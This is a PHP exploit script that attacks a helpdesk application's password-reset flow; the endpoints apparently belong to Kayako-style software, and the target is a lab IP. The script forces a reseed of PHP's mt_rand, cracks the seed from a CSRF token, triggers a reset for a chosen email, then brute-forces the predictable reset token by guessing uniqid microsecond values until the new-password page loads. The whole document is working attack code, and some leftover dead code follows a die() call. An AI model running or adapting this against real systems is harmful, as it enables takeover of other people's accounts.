<?php

function BuildHash()
{
	return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
}

/**
 * Build a Unique Hash Block
 *
 * @author John Haugeland
 * @return string The Hash Block
 */
function BuildHashBlock()
{
    $sub = mt_rand(0, 36 * 36 * 36);
	$Ch1to3 = $sub - 1;		// largest alphanum power that'll fit in the minimum guaranteed 16-bit range for mt_randmax()
    $sec = mt_rand(0, 36 * 36);
	$Ch4to5 = $sec - 1;
	$Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);  // only want the bottom two characters of entropy, but clip a large range to keep from much influencing probability

	return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
}

function getCsrfHashFromPage($page) {
    preg_match('~name="_csrfhash" value="([^"]*)"~', $page, $matches);
    return $matches[1];
}

function getRandsFromHash($block) {
    $first = base_convert(substr($block, 0, 3), 36, 10) + 1; // mod 46656
    $second = base_convert(substr($block, 3, 2), 36, 10) + 1; // mod 1296
    return array($first, $second);
}

function findSeed($hash, $start, $end) {
    list($first, $second) = getRandsFromHash($hash);
    printf("Working from %.6f to %.6f\n", $end, $start);
    $start_usec = $start * 1e6;
    $end_usec = $end * 1e6;

    $current_usec = $end_usec;
    while ($current_usec >= $start_usec) {
        $seconds = floor($current_usec / 1e6);
        $usec = ($current_usec % 1e6) / 1e6;

        $seed = (float) $seconds + ((float) $usec * 100000);
        mt_srand($seed);
        for ($i = 0; $i < 40; $i++) {
            if (mt_rand(0, 36 * 36 * 36) == $first && mt_rand(0, 36 * 36) == $second) {
                return array($seed, $seconds + $usec);
            }
        }

        $current_usec -= 1;
    }
    die('seed not found');
}

function timeBetweenUniqid($url) {
    // We want a new CSRF each time, so don't enable cookies
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    $times = [];

    for ($i = 0; $i < 10; $i++) {
        curl_setopt($curl, CURLOPT_URL, $url);
        $response = curl_exec($curl);
        $hash = getCsrfHashFromPage($response);

        $prev_time = null;
        for ($p = 0; $p < 4; $p++) {
            $time_part = substr($hash, 5 + $p * 8, 3);
            $time_dec = base_convert($time_part, 36, 10);
            if ($prev_time) {
                $times[] = $time_dec - $prev_time;
            }
            $prev_time = $time_dec;
        }
    }
    sort($times);
    return [$times[3], $times[count($times)-3]];
}

$base_url = 'http://172.16.122.131:8333';
$reseed_url = $base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1";
$captcha_url = $base_url . "/index.php?/Base/Captcha/GetWordImage";
$test_url = $base_url . '/test.php';
$lost_pw_url = $base_url . "/index.php?/Base/UserLostPassword/Index";
$lost_pw_post = $base_url . "/index.php?/Base/UserLostPassword/Submit";
$validate_url = $base_url . "/index.php?/Base/UserLostPassword/Validate/";

// Persistent curl object
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($curl, CURLOPT_PROXY, 'http://172.16.122.128:8080');
curl_setopt($curl, CURLOPT_COOKIEJAR, '/dev/null');

// Cause mt_srand call and remember about when it happened
curl_setopt($curl, CURLOPT_URL, $reseed_url);
$start = microtime(true);
curl_exec($curl);
$end = microtime(true);

// print_r(timeBetweenUniqid($base_url));

// Get a valid hash
curl_setopt($curl, CURLOPT_URL, $base_url);
$response = curl_exec($curl);
$hash = getCsrfHashFromPage($response);

// Crack the seed of mt_rand
list($seed, $time) = findSeed($hash, $start, $end);
$srand_called_time = $time - $start;
echo "mt_srand called " . $srand_called_time . " seconds after call\n";

// Retrieve page
curl_setopt($curl, CURLOPT_URL, $lost_pw_url);
$response = curl_exec($curl);

// Ask for reset password
curl_setopt($curl, CURLOPT_URL, $lost_pw_post);
curl_setopt($curl, CURLOPT_POSTFIELDS, 'email=some%40user.com');
$start = microtime(true);
$response = curl_exec($curl);
$end = microtime(true);

mt_srand($seed);
for ($i = 0; $i < 42; $i++) {
    mt_rand();
}
$base_hash = BuildHash();
echo $base_hash."\n";

function combineHash($base, $u1, $u2, $u3, $u4) {
    $usecs = [$u1, $u2, $u3, $u4];
    $result = '';
    for ($i = 0; $i < 4; $i++) {
        $result .= substr($base, 8 * $i, 5);
        $result .= usec_to_hashpart($usecs[$i]);
    }
    return $result;
}

list($min_time, $max_time) = timeBetweenUniqid($base_url);

curl_setopt($curl, CURLOPT_POSTFIELDS, null);
$usecs = ($start + $srand_called_time) * 1000000;
for ($i = 1; $i < 50000; $i++) {
    for ($usecs2 = $usecs + $min_time; $usecs2 < $usecs + $max_time; $usecs2++) {
        for ($usecs3 = $usecs + $min_time; $usecs3 < $usecs + $max_time; $usecs3++) {
            for ($usecs4 = $usecs + $min_time; $usecs4 < $usecs + $max_time; $usecs4++) {
                $hash = combineHash($base_hash, $usecs, $usecs2, $usecs3, $usecs4);
                printf("%s\n", $hash);

                $url = $validate_url . $hash;
                curl_setopt($curl, CURLOPT_URL, $url);
                $response = curl_exec($curl);
                if (strpos($response, 'Please enter your new password')) {
                    die($url."\n");
                }
            }
        }
    }

    if ($i % 2 == 0) {
        $usecs -= $i;
    } else {
        $usecs += $i;
    }
}

die();
$mid = dechex((hexdec($end) - hexdec($start)) / 2 + hexdec($start));
echo "$start $mid $end \n";

$current = $start;
$possible_time_chars = [];
while (hexdec($current) <= hexdec($end)) {
	$Ch6to8 = hexdec(substr($current, -6)) % (36 * 36 * 36);
	$chars = str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
    $possible_time_chars[] = $chars;

    $current = dechex(hexdec($current) + 1);
}
// $possible_time_chars = array_unique($possible_time_chars);
// print_r($possible_time_chars);
echo count($possible_time_chars);



function usec_to_uniqid($usecs) {
    $secs = $usecs / 1000000;
    $usec = $usecs % 1000000;
    return sprintf("%08x%05x", $secs, $usec);
}

function uniqid_to_hashpart($uniqid) {
	$Ch6to8 = hexdec(substr($uniqid, -6)) % (36 * 36 * 36);
	$chars = str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
    return $chars;
}

function usec_to_hashpart($usecs) {
    return uniqid_to_hashpart(usec_to_uniqid($usecs));
}

